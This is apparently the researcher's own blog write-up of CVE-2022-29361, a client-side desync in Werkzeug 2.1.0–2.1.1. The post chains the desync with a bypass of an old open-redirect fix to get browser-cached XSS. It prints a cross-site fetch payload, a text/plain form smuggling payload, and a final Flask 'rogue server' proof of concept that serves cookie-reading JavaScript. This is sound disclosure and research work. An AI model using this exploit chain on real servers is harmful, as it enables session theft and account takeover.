---
source: kevin-mizu
source_url: https://mizu.re/post/abusing-client-side-desync-on-werkzeug
title: "Abusing Client-Side Desync on Werkzeug | mizu.re"
description: "Abusing Client-Side Desync on Werkzeug"
---

_keyboard\_arrow\_up_

title: Abusing Client-Side Desync on Werkzeug

date: Jun 07, 2023

tags: [Article](https://mizu.re/tag/Article) [Web](https://mizu.re/tag/Web) [Request\_Smuggling](https://mizu.re/tag/Request_Smuggling)

PDF Version can be found [here](https://mizu.re/articles/articles/vuln04_csd_werkzeug/abusing-client-side-desync-on-werkzeug.pdf)

# Abusing Client-Side Desync on Werkzeug

- [📜 Introduction](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#introduction)
- [🏗️ Setting up a vulnerable environment](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#setting-up-a-vulnerable-environment)
- [🕳️ HTTP request parsing error in Werkzeug](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#http-request-parsing-error-in-werkzeug)
  - [Finding the vulnerable commit](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#finding-the-vulnerable-commit)
  - [Understanding the issue](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#understanding-the-issue)
- [🪟 Client-Side Desync to the rescue](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#client-side-desync-to-the-rescue)
  - [What are Client-Side Desync attacks?](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#what-are-client-side-desync-attacks)
  - [Where do they occur?](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#where-do-they-occur)
  - [How to abuse them?](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#how-to-abuse-them)
- [💥 Exploit Chain](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#exploit-chain)
  - [Keeping the user session](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#keeping-the-user-session)
  - [Construct the exploit chain](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#construct-the-exploit-chain)
- [🔍 Finding an open redirect](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#finding-an-open-redirect)
  - [Old reported vulnerabilities](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#old-reported-vulnerabilities)
  - [Understanding the vulnerability](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#understanding-the-vulnerability)
  - [Understanding the fix](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#understanding-the-fix)
  - [Bypassing the fix](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#bypassing-the-fix)
- [🧩 Wrapping up everything](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#wrapping-up-everything)
  - [Summary](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#summary)
  - [Creating the client-side exploit](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#creating-the-client-side-exploit)
  - [Prepare the rogue web server](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#prepare-the-rogue-web-server)
  - [Perform the final exploit chain](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#perform-the-final-exploit-chain)
- [🏁 Conclusion](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#conclusion)
- [🙏 Acknowledgements](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#acknowledgements)
- [📚 References](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#references)

## 📜 Introduction

Werkzeug is a python Web Server Gateway Interface ( [WSGI](https://wsgi.readthedocs.io/en/latest/what.html)) library for website development. It provides a simple way to set up an operational HTTP server for developers and is mostly present in [Flask](https://flask.palletsprojects.com/) in development mode. In latest versions, Werkzeug use [python library](https://docs.python.org/3/library/http.server.html) to handle most parts of the HTTP protocol.

In this paper, we will deep dive into an interesting case of Client-Side Desync ( [CVE-2022-29361](https://nvd.nist.gov/vuln/detail/cve-2022-29361)) on Werkzeug versions 2.1.0 to 2.1.1 (included). Using this vulnerability on a vulnerable host could lead to a full account takeover exploit via XSS.

## 🏗️ Setting up a vulnerable environment

In the next sections, we will use the following vulnerable web application implemented with Flask in development mode. This application contains only one route and exposes only one static JavaScript file, hosted on /static/js/main.js. (Gitub repository [here](https://github.com/kevin-mizu/Werkzeug-CVE-2022-29361-PoC)

```py
from flask import Flask

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    return """
    <h1>CVE-2022-29361 | Client-Side Desync to XSS</h1>
    <script src='/static/js/main.js'></script>
    """

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

**Fig. 1**: Vulnerable application used in this paper.

In addition, for this application to be vulnerable, the right Werkzeug version must be installed. The best way to setup the vulnerable environnement is to use python virtual environment which allows to control and sandbox the vulnerable environment. This is a mandatory step to setup a vulnerable environment as this exploit doesn't work in the latest version.

```sh
# In PoC folder
python3 -m venv .
source bin/activate
python3 -m pip install Werkzeug==2.1.0 Flask==2.1.0
```

| Package | Version |
| --- | --- |
| Flask | 2.1.0 |
| Werkzeug | 2.1.0 |
| Jinja2 | 3.1.2 |
| itsdangerous | 2.1.2 |
| click | 8.1.3 |
| setuptools | 59.6.0 |
| pip | 22.0.2 |
| MarkupSafe | 2.1.2 |

**Fig. 2**: Install libraries in vulnerable version.

Using this application along a safe version of Werkzeug should handle GET and POST requests properly. Even if this application is quite simple, we will show that in our case it is possible to change the application workflow.

## 🕳️ HTTP request parsing error in Werkzeug

### Finding the vulnerable commit

As Werkzeug is a development Web Server Gateway Interface ( [WSGI](https://wsgi.readthedocs.io/en/latest/what.html)), [Pallets Projects](https://github.com/pallets)) frequently updates the code of the Werkzeug core to facilitate its usage. Among the changes, the commit [4795b9a7](https://github.com/pallets/werkzeug/commit/4795b9a7) (released in january 2022) aims to enable HTTP/1.1 when server has multiple workers. This commit is special as it forces Werkzeug to use keep-alive connections when threaded or processes options are enabled. At first sight, this modification isn't an issue, but still creates new possible attack vectors on Werkzeug.

This commit was merged into Werkzeug production branch in commit [9a3a981d70d2e9ec3344b5192f86fcaf3210cd85](https://github.com/pallets/werkzeug/commit/9a3a981d70d2e9ec3344b5192f86fcaf3210cd85) and later available in release 2.1.0. After this commit, issues [#2380](https://github.com/pallets/werkzeug/issues/2380) and [#4507](https://github.com/pallets/flask/issues/4507) involving bugs in the query handler were opened.

### Understanding the issue

In impacted versions, when performing a POST request with parameters that aren't properly handled in the Flask application, it will break the next HTTP request. From the developer's point of view, this was more annoying than dangerous and was not interpreted as a security issue. But is it really not a security issue?

```py
from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return """<form method="POST">
            <input type="text" name="name">
            <button type="submit">VALIDATE</button>
        </form>"""

    if request.method == "POST":
        # name = request.form.get("name") # Do not retrieve the name value
        return '<h1>Hello: XXX</h1><iframe src="/">'

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

![http_parsing_error_01.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/http_parsing_error_01.png)

**Fig. 3**: 2.1.0 ≤ Werkzeug ≤ 2.1.1 improper handling of POST parameters.


From this issue, it is possible to control arbitrary bytes in the next request from the body of a POST request. As explained in the issue [#2546](https://github.com/pallets/werkzeug/issues/2546), this behavior comes from python [http.server](https://docs.python.org/3/library/http.server.html) module which doesn't properly handle keep-alive connections. Therefore, when not handled in the Flask application, POST parameters are left in the connection queue and are still usable at the beginning of the next request. Moreover, all queries made to the server are sent over the same connection (ID) that is used for local ressources access which gives an interesting context to perform Client-Side Desync attacks.

![http_parsing_error_02.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/http_parsing_error_02.png)

**Fig. 4**: Same connection ID is used for multiple local ressources access.

## 🪟 Client-Side Desync to the rescue

### What are Client-Side Desync attacks?

Client-Side Desync attacks are a subset of request smuggling attacks, which occur between the browser and the web server without proxy. This vulnerability is made possible when a web server doesn't properly handle the request's body during keep-alive connections. James Kettle ( [@albinowax](https://twitter.com/albinowax)) published an excellent [article](https://portswigger.net/research/browser-powered-desync-attacks) on the subject last summer which describe them in very specific details.

Let's deep dive into a step-by-step example of a Client-Side Desync:

![client_side_desync_01.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/client_side_desync_01.png)

**Fig. 5**: Incorrect server-side parsing leads to Client-Side Desync.

In the figure above, the client sends a POST request in keep-alive mode which contains the beginning of another GET request in the body. If the web server is vulnerable, it will not process the request body and leave it in the connection queue. Then, when the browser sends another request, it will read the previous POST request body and the newly received GET request. Thus, the client will expect to receive the content of /login, but instead the web server will answer with /404.

![client_side_desync_02.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/client_side_desync_02.png)

**Fig. 6**: Difference between browser request (URL) and server response (page content).

### Where do they occur?

Client-Side Desync mainly occurs on endpoints that don't require data to be sent. As an example, a static image file or a server side redirection endpoint may be good candidates as they usually don't require user to provide information.

### How to abuse them?

Depending on the context of the vulnerability, it could be more convenient than dangerous for the client as he can't navigate properly over the website. However, the real problem is happening when it is possible to perform cross-site attacks and keep the user's session thanks to [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin) or cookie [missconfiguration](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite). Under this particular conditions and depending on the website features, it might be possible to abuse them to leak the Cookie header of the second query. A good example of this attack can be found on [PortSwigger Academy](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync).

To perform this cross-site attack, the easiest way is to use the fetch JavaScript function which allows to keep the same connection ID between several requests.

```js
fetch('http://localhost:5000/register', {
    method: 'POST',
    body: 'GET /404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include'
}).catch(() => {
    location = 'http://localhost:5000/login'
})
```

**Fig. 7**: Cross-site JavaScript payload to perform Client-Side Desync.

## 💥 Exploit Chain

### Keeping the user session

When performing a cross-site attack, the browser will send the user's cookies depending on the value of [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) flag on them. This attribute can have 3 different states: None, Lax and Strict. When configured to None, the cookie will be sent with each request even in a cross-site context. At the opposite, the strict value will prevent the cookie from being sent. The last possible value, Lax, will limit cookie to be sent only for GET requests which involve user interaction. Moreover, this security is not applied in case the current domain is SameSite with the remote one.

| Origin A | Origin B | SameSite? |
| --- | --- | --- |
| https://mizu.re | http://mizu.re | Noo, scheme matter |
| https://sub1.mizu.re | https://sub2.mizu.re | Yes, subdomains don't matter |
| https://mizu.re | https://rhackgondins.com | Noo, different eTLD+1 |

**Fig. 8**: Determining if an URL is considered as SameSite.

Usually, this flag or the Cross-Origin Resource Sharing ( [CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)) headers values must be checked before performing cross-site attacks. In our context, the final objective is to get a JavaScript execution. Therefore, even if the cookies aren't sent over the first requests, they will be accessible from the JavaScript after the exploitation.

### Construct the exploit chain

In section [HTTP request parsing error in Werkzeug](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#http-request-parsing-error-in-werkzeug), we exposed a request smuggling vulnerability in Werkzeug 2.1.0 to 2.1.1, without exposing any security risk. In section [Client-Side Desync to the rescue](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#client-side-desync-to-the-rescue), we learned what Client-Side Desync are and how to use them. A notable difference in the Werkzeug context is its connection management. In fact, in vulnerable versions, it will keep the same connection ID for each query, this is really interesting as it allows to potentially desync a request to a ressource initiated by the browser.

Therefore, if the first ressource is a script file, it might be possible to control its content thanks to the Client-Side Desync vulnerability. As the vulnerable application hasn't any file upload feature, it is not possible to control a file on the server. It is necessary to find an open redirect vulnerability inside the Werkzeug core, to use it to change the script file location.

![exploit_chain_01.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/exploit_chain_01.png)

**Fig. 9**: Abuse open redirect to change script location.

## 🔍 Finding an open redirect

### Old reported vulnerabilities

Werkzeug is a development WSGI which makes it more focused on usability than security. Therefore, it is important to take a look to newly added features or old vulnerability fixes and reports. Among them, an 8 years old open redirect inside Werkzeug core reported on [#822](https://github.com/pallets/werkzeug/issues/822) ( [CVE-2020-28724](https://nvd.nist.gov/vuln/detail/CVE-2020-28724)) is a good start to go. This vulnerability was firstly reported on Flask repository and occured when using an URL path that starts by 2 slashes. Setting up a local vulnerable version is useful to properly understand the issue. When trying to access it with a double slash path we successfully get redirected to the remote ressource. If a way to bypass the security fix exists, this could be the last gadget needed for the final exploit.

![open_redirect_01.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/open_redirect_01.png)

**Fig. 10**: Open redirect on Werkzeug < 0.11.6.

### Understanding the vulnerability

This vulnerability occurs in the Werkzeug custom URL parser. When it parses the path in the URL, it assumes that //mizu.re is associated to the mizu.re domain and performs a redirection. As this URL parser is used for development purposes, it does not respect [RFC2396](https://www.rfc-editor.org/rfc/rfc2396) and [RFC3986](https://www.rfc-editor.org/rfc/rfc3986) on many important parsing elements.

![open_redirect_02.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/open_redirect_02.png)

**Fig. 11**: URL composition as defined in the RFC.

![open_redirect_03.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/open_redirect_03.png)

**Fig. 12**: URL composition as parsed by [Werkzeug's URL parser](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/urls.py#L457})

Testing the Werkzeug's URL parser locally on valid and not valid URL gives interesting results. In fact, in case of an URL starting with double slashes, the parser will consider that the scheme is empty but the netloc is not.

```py
from werkzeug.urls import url_parse

# Normal URL
output = url_parse("https://mizu.re/path?a=1#1")
print(output.scheme)   # https
print(output.netloc)   # mizu.re

# Vulnerable open redirect URL
output = url_parse("//mizu.re/path?a=1#1")
print(output.scheme)   # empty
print(output.netloc)   # mizu.re
```

**Fig. 13**: Werkzeug custom parser tests.

Because of that parsing, when the Werkzeug request handler uses this result, it will redirect the request to the according netloc domain. Even if this netloc domain is external to the vulnerable website.

```py
class WSGIRequestHandler(BaseHTTPRequestHandler):
    """A request handler that implements WSGI dispatching."""
    # ...
    if request_url.netloc:
        environ['HTTP_HOST'] = request_url.netloc
```

**Fig. 14**: Werkzeug issue [#822](https://github.com/pallets/werkzeug/issues/822) ( [CVE-2020-28724](https://nvd.nist.gov/vuln/detail/CVE-2020-28724)) fix.

### Understanding the fix

The Werkzeug project has fixed this vulnerability in the commit [556bdcb13516617335c10efdedf3c1bd50b31b6d](https://github.com/pallets/werkzeug/commit/556bdcb13516617335c10efdedf3c1bd50b31b6d). They ensure that the scheme in the url\_parse output is not empty with a valid netloc. This is a good way to fix it has there is now way for a malicious user to create an URL with those conditions on the URL path. This would be like trying to go to https://domain.comhttps://mizu.re which makes no sense.

```py
class WSGIRequestHandler(BaseHTTPRequestHandler):
    """A request handler that implements WSGI dispatching."""
    # ...
    if request_url.scheme and request_url.netloc:
        environ['HTTP_HOST'] = request_url.netloc
```

**Fig. 15**: Werkzeug commit [556bdcb13516617335c10efdedf3c1bd50b31b6d](https://github.com/pallets/werkzeug/commit/556bdcb13516617335c10efdedf3c1bd50b31b6d).

### Bypassing the fix

Even if the fix prevents the abuse of the open redirect in normal browser's usage, the redirection will still be present. Indeed, using BurpSuite to create a malicious query that contains a full URL instead of a path would allow to reproduce this behavior.

![open_redirect_08.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/open_redirect_08.png)

**Fig. 16**: Werkzeug redirect using URL instead of the path.

As we have a Client-Side Desync in Werkzeug, and this kind of attacks allows to control arbitrary bytes of the next request, it is possible to abuse it to recreate the open redirect payload from a malicious HTTP request.

In addition, it is important to notice that the redirect isn't a simple 302 redirect, but a 308 permanent redirect. This type of redirect will force the browser to cache the actual location of the ressource for further usage. Therefore, successfully achieving the full chain exploit would poison the location of the script for each loading page, even if the victim user doesn't trigger the attack again. It is a XSS poisoned into the cache of the client's browser.

![open_redirect_09.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/open_redirect_09.png)

**Fig. 17**: Malicious request to perform Client-Side Desync.

![open_redirect_10.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/open_redirect_10.png)

Second request results in open redirect.

## 🧩 Wrapping up everything

### Summary

As seen in sections [HTTP request parsing error in Werkzeug](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#http-request-parsing-error-in-werkzeug) and \ [Finding an open redirect](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#finding-an-open-redirect), we have demonstrated how to perform a request smuggling and an open redirect inside Werkzeug core on versions 2.1.0 to 2.1.1. As explained in section [Client-Side Desync to the rescue](https://mizu.re/post/abusing-client-side-desync-on-werkzeug#client-side-desync-to-the-rescue), these 2 vulnerabilities can be chained together to perform a Client-Side Desync to control the content of the JavaScript file. In the next section, we will create a real-world payload that can be triggered from the browser context leveraging Client-Side Desync and XSS.

![putting_all_together_01.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/putting_all_together_01.png)

**Fig. 18**: Final exploit chain.

### Creating the client-side exploit

To create the client-side exploit, we need to find a way to send the payload cross-site with one request which will change the first resource location. The necessary condition for this exploit is that the connection of the malicious request must be in keep-alive mode. If this condition is not met, the connection will immediately be closed and no exploit would be possible. But, if the condition is met, when posting an HTML <form>, the data will be sent over a keep-alive connection. Therefore, the best way to achieve our exploit will be to use a <form> with method="POST" using target="http://vulnerable-website/".

As we want to control the first bytes of the next query, we will need to use space and line return (CR.LF). In order to wrap this kind of payload into a <form> POST data, we need to insert it inside the attribute name value. Using an HTML textarea element with name="GET https://mizu.re HTTP/1.1\\r\\nX-Header: X" and value="" will make the payload easier to handle.

```html
<form action="http://vulnerable-website:5000/" method="POST">
<textarea name="GET http://rogue-web-server:5000 HTTP/1.1
Foo: x">Mizu</textarea>
<button type="submit">CLICK ME</button>
</form>
```

![putting_all_together_03.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/putting_all_together_03.png)

**Fig. 19**: Simple form with Client-Side Desync payload. URL encoded body content, the payload is invalid.

Unfortunately, by default, requests made by the HTML <form> use application/x-www-form-urlencoded MIME Type. Therefore, if it is not possible to have spaces or line returns, we can't craft the payload properly and the exploit is not possible with this MIME type. This could look like a dead cause, but reading the [MDN documentation](https://developer.mozilla.org/en-US/) about <form> tag and interesting attributes can be found. To change the previous request MIME Type to text/plain, the [enctype](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/enctype) attribute can be used in the HTML <form> tag.

```html
<form id="x" action="http://vulnerable-website:5000/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://rogue-web-server:5000 HTTP/1.1
Foo: x">Mizu</textarea>
<button type="submit">CLICK ME</button>
</form>
```

![putting_all_together_05.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/putting_all_together_05.png)

**Fig. 20**: Simple form with Client-Side Desync payload using text/plain encoding.

### Prepare the rogue web server

To perform this exploit chain, it is necessary to setup a rogue server which will return the malicious JavaScript content and a second route can be defined to deliver the exploit payload to thevictim. With two routes, it will be easier to manage everything in one application. (Github repository [here](https://github.com/kevin-mizu/Werkzeug-CVE-2022-29361-PoC))

```python
from flask import Flask, Response

app = Flask(__name__)

@app.route("/")
def index():
    resp = Response("alert(document.domain); alert(document.cookie)")
    resp.headers["Content-Type"] = "text/plain"
    return resp

@app.route("/exploit")
def exploit():
    expl_server = "http://127.0.0.1:5000" # no slash is important to make it works
    vuln_server = "http://127.0.0.1:5001/"
    return """
    <form id="x" action="%s"
    method="POST"
    enctype="text/plain">
    <textarea name="GET %s HTTP/1.1
    Foo: x">Mizu</textarea>
    <button type="submit">CLICK ME</button>
    </form>
    <script> x.submit() </script>
    """ % (vuln_server, expl_server)

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
```

**Fig. 21**: Final Proof of Concept.

### Perform the final exploit chain

Finally, sending the exploit URL to the victim will perform everything described earlier and execute the XSS. Therefore, each time a new page is opened containing the same script file, the XSS will be triggered. This leads to a full compromise of the website thanks to the cached malicious javascript file in the user's browser. A complete video demonstration of the exploit can be found [here](https://www.youtube.com/watch?v=HJWafpbMcbA).

![putting_all_together_07.png](https://mizu.re/articles/articles/vuln04_csd_werkzeug/images/putting_all_together_07.png)

**Fig. 22**: XSS triggered after running the payload cross-site.

### 🏁 Conclusion

We have demonstrated an efficient Client-Side Desync attack on Werkzeug WSGI. This attack allows to perform XSS on a vulnerable instance without any requirements. Moreover, even if the challenge was to find an exploit with no requirements, this full chain attack could be performed in a much more easier way if other vulnerabilities are already present in the web application.

While this paper only focus on vulnerability research on Werkzeug which is only used in development server, it would be interesting to conduct the same research on production WSGI.

### 🙏 Acknowledgements

I would like to thank Remi GASCOU ( [@podalirius\_](https://twitter.com/podalirius_)) for helping me on vulnerability report stages and reviewing this paper.

### 📚 References

- Cors access control allow origin. [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).
- enctype form attribute. [https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/enctype](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/enctype).
- Pallets projects. [https://github.com/pallets](https://github.com/pallets).
- Post requests mime-types. [https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/POST).
- Samesite cookie attribute. [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite).
- abergmann. Issue 2546: Http request smuggling inside the development server. [https://github.com/pallets/werkzeug/issues/2546](https://github.com/pallets/werkzeug/issues/2546).
- James Kettle (@albinowax). Browser-powered desync attacks: A new frontier in http request smuggling. [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks).
- Ramin Frajpour Cami. Werkzeug open redirect cve-2020-28724. [https://nvd.nist.gov/vuln/detail/CVE-2020-28724](https://nvd.nist.gov/vuln/detail/CVE-2020-28724).
- International Networking Working Group. Rfc2396: Uniform resource identifiers (uri): Generic syntax. [https://www.rfc-editor.org/rfc/rfc2396](https://www.rfc-editor.org/rfc/rfc2396).
- International Networking Working Group. Rfc3986: Uniform resource identifier (uri): Generic syntax. [https://www.rfc-editor.org/rfc/rfc3986](https://www.rfc-editor.org/rfc/rfc3986).
- ImreC. Issue 2380: Http request smuggling inside the development server. [https://github.com/pallets/werkzeug/issues/2380](https://github.com/pallets/werkzeug/issues/2380).
- Web Server Gateway Interface. What is wsgi? [https://wsgi.readthedocs.io/en/latest/what.html](https://wsgi.readthedocs.io/en/latest/what.html).
- Kevin GERVOT (Mizu). Werkzeug request smuggling cve-2022-29361. [https://nvd.nist.gov/vuln/detail/cve-2022-29361](https://nvd.nist.gov/vuln/detail/cve-2022-29361).
- Mozilla. Developer network docs. [https://developer.mozilla.org/en-US/](https://developer.mozilla.org/en-US/).
- OWASP. Xs leaks. [https://cheatsheetseries.owasp.org/cheatsheets/XS\_Leaks\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html).
- PalletsTeam. Werkzeug 0.11.6 open redirect fix. [https://github.com/pallets/werkzeug/commit/556bdcb13516617335c10efdedf3c1bd50b31b6d](https://github.com/pallets/werkzeug/commit/556bdcb13516617335c10efdedf3c1bd50b31b6d).
- PortSwigger. Lab: Client-side desync. [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync).
- Pallets Projects. Flask. [https://flask.palletsprojects.com/](https://flask.palletsprojects.com/).
- Python. http.server - http servers. [https://docs.python.org/3/library/http.server.html](https://docs.python.org/3/library/http.server.html).
- tangbinyeer. Issue 4507: Flask 2.1.0 can’t handle request method properly when sending post repeatedly with an empty body. [https://github.com/pallets/flask/issues/4507](https://github.com/pallets/flask/issues/4507).
- ThiefMaster. Issue 822: dev server sets wrong http\_host when path starts with a double slash. [https://github.com/pallets/werkzeug/issues/822](https://github.com/pallets/werkzeug/issues/822).
- Werkzeug. Commit introducing the vulnerability. [https://github.com/pallets/werkzeug/commit/9a3a981d70d2e9ec3344b5192f86fcaf3210cd85](https://github.com/pallets/werkzeug/commit/9a3a981d70d2e9ec3344b5192f86fcaf3210cd85).
- Werkzeug. Werkzeug url\_parse. [https://github.com/pallets/werkzeug/blob/main/src/werkzeug/urls.py#L457](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/urls.py#L457)

[_keyboard\_arrow\_left_ Linux local electron application script-src: self bypass](https://mizu.re/post/linux-local-electron-application-script-src-self-bypass)

[XSS me luigi _keyboard\_arrow\_right_](https://mizu.re/post/xss-me-luigi)